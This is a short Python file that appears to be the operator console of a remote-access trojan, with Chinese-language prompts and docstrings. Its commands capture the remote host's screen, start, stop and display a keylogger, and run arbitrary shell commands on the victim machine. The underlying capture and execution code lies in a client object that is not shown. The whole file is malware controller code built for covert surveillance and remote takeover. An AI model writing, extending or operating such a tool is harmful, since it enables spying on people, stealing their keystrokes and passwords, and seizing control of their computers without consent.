# client/interface.py
import cmd
import os


class CommandInterface(cmd.Cmd):
    prompt = 'Remote> '

    def __init__(self, client):
        super().__init__()
        self.client = client

    def do_screenshot(self, arg):
        """获取远程主机的屏幕截图"""
        if self.client.get_screenshot():
            print("截图已保存")
        else:
            print("截图失败")

    def do_keylog(self, arg):
        """控制键盘记录器 (start/stop/show)"""
        if arg not in ['start', 'stop', 'show']:
            print("用法: keylog [start|stop|show]")
            return

        response = self.client.control_keylogger(arg)
        print(response.get('message', '操作失败'))

    def do_shell(self, arg):
        """执行shell命令"""
        if not arg:
            print("用法: shell <command>")
            return

        response = self.client.execute_shell(arg)
        if response:
            print(response.get('data', '命令执行失败'))

    def do_exit(self, arg):
        """退出程序"""
        self.client.close()
        return True


def start_interface(client):
    interface = CommandInterface(client)
    interface.cmdloop("远程控制客户端启动...")